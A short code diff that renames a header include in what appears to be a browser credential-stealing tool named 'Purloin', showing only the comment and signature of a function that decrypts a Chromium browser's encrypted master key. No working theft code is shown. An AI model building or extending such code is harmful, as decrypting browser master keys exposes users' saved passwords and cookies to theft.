@@ -1,4 +1,4 @@
-#include "includes/Purloin_Chrome.h"
+#include "includes/Purloin_Chromium.h"
 
 // Decrypt the obtained master key. Decrypted byte form is stored on the [DATA_BLOB] blob_dec_masterkey 
 BOOL decrypt_masterkey(PWCHAR enc_master_key, PCHAR char_master_key, WORD enc_char_master_key_size, DATA_BLOB* blob_dec_masterkey, PSTR buf_outMsg, DWORD buf_outSize) {
